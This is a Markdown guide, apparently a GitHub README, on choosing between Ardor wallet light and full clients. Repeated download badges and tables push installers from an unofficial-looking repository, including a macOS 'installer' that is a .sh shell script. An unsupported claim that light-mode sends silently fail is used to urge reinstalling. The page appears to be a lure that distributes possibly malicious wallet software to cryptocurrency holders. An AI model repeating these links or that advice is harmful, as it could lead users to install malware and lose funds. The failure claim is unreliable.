![Ardor Wallet guide](assets/banner-article.png)

# Ardor light client or full node: choose before you start

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A light client keeps no blockchain data and reads balances from remote nodes, while a full client downloads and validates the chain on your own machine. Choose the full client if you forge, hold a large balance or want independence from someone else's server; choose the light client for occasional use on a laptop that should not carry a database.

## What each one actually is

The difference is not a setting inside the same program so much as the amount of the [Ardor chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) the program keeps. A full client stores every block, checks it against the protocol rules and answers its own questions. A light client stores nothing, asks remote nodes for the specific balances and transactions it displays, and trusts those answers.

| | Full client | Light client |
|---|---|---|
| Chain data | Stored locally, grows over time | None |
| Trust | Validates the chain itself | Trusts remote nodes |
| First start | Hours of syncing | Seconds |
| Forging | Possible | Not possible |
| Disk | Several gigabytes and rising | Negligible |

Neither is a security upgrade over the other in the sense people hope for. Both keep the secret on your machine; the difference is whose copy of the chain you believe.

## What light mode cannot do

A light client cannot submit a transaction reliably. The known behaviour is that a send appears submitted and is never broadcast, with no error shown and no funds lost. The transaction simply does not reach the network.

The workaround is to switch to the full client: reinstall without the light-client option, or set `nxt.isLightClient=false` in the client's configuration file and restart. The transaction can then be sent again. Anyone who has "lost" a payment in light mode has usually found it still sitting in the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md), because it never left. That single behaviour is the strongest practical reason to prefer the full build for anything that matters.

## Which one fits your use

| If you | Choose |
|---|---|
| Forge, or plan to lease to a forger | Full client: forging requires a node that tracks the chain |
| Hold a balance you would notice losing | Full client, for an independent view of your own funds |
| Open the wallet a few times a month | Light client, and check large balances elsewhere before acting |
| Run the wallet on a machine with little free disk | Light client |
| Need to send urgently from a machine that never synced | Full client on another machine, or accept the wait |

The recurring theme is that light mode is a viewing convenience. The moment an action matters, the full client is the tool that performs it without a caveat.

One more distinction is worth keeping straight: a light client is not a thin client of a website. It is the same application with the chain removed, so the secret handling, the signing and the account derivation are identical to the full build. The difference is only whose copy of the chain answers the questions.

## Switching between them

Going from light to full means reinstalling without the light option, or flipping the configuration property and restarting, then waiting for the first [sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md). Going from full to light is the reverse and costs nothing but the local database, which you can delete afterwards.

The account is unaffected either way. It comes from your secret, so a reinstall does not change the address, and the [Ardor balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) appears as soon as the chosen mode can see the chain.

## The cost of running a full node

A full client needs disk space that grows with the chain, a machine that can stay awake long enough to finish the first download, and a connection that is not metered by the gigabyte. It also needs the port rules to allow peers, which is the most common reason a first sync stalls.

In exchange it gives you a wallet that answers to nobody, a node you can forge with, and a local record you can inspect. For a holder who checks a balance once a month, that is more than the job requires; for anyone forging or moving larger amounts, it is the baseline.

There is a maintenance side as well. A node that falls behind after a release is a node that needs updating, and when a change is a mandatory fork the update is not optional - an older build keeps running and stops following the chain. Budget an hour for an update rather than five minutes.

## What the remote node can see

A light client asks targeted questions: does this address hold anything, what are its recent transactions. The node learns which addresses you are interested in, along with your network address, and that is the whole of the privacy cost.

It does not learn your secret, and it cannot sign for you. The risk is correlation rather than theft, which is worth knowing if you would rather nobody could map a set of addresses to your connection. A full client has no such conversation, because it answers its own questions from its own copy of the chain.

## When a light client is the right call

Light mode is correct when the wallet is a window rather than a tool: checking a balance from a laptop, confirming that a deposit landed, showing someone an address. In those moments the cost of a full sync is absurd and the cost of trusting a node is small.

It is the wrong call when you are about to send. The known submit failure is exactly the action light mode handles worst, and the failure is silent. If a send matters, move to a machine running a full client rather than hoping this one behaves.

## FAQ

### Can I forge with a light client?

No. Forging needs a node that follows the chain and can produce blocks, which a light client does not do.

### Does a light client expose my passphrase to the remote node?

No. The secret stays on your machine and signing happens locally. The remote node sees the addresses you query, not your secret.

### Can I switch to full mode later without losing anything?

Yes. The account comes from the secret, and switching only changes how the chain is read. The local database is rebuilt, and the balance returns.

### Why did my transaction never arrive while using the light client?

Because it was never broadcast. Switch to the full client and send it again; the funds are still in the account.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Where Ardor stores blockchain data, and how much space it takes](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/where-ardor-stores-blockchain-data.md)
- [Why the Ardor wallet shows a zero balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md)
- [Fix an Ardor wallet that will not sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md)
- [Ardor node ports and the firewall rules that block them](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-node-ports-and-firewall.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
